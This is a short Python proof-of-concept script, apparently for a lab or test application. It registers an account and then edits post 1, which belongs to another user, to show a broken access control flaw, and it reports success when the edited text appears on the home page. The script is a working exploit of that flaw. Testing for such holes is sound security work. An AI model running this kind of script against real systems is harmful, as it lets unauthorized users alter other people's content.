#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username="asdf"
password="asdf"

session = requests.Session()
reset_app(session, url)
register(session, url, username=username, password=password)

# create new post
post_id = "1"
content = "Very interesting content. This was not written by me!"
privacy = "Public"

send_edit_post(session, url, post_id=post_id, content=content, privacy=privacy)
homepage = get_home(session, url)
assert content in homepage.text
session.close()

print("[+] Successfully edited other user's post")
